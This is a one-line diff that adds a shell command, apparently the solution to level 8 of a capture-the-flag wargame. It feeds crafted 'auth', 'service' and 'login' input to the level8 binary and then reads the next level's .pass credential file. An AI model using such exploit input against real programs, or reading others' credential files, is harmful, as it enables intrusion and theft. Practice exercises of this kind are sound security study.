@@ -1,0 +1,1 @@
+(python -c 'print ("auth A"); print ("service"); print ("service"); print ("login")'; echo cat /home/user/level9/.pass) | ./level8
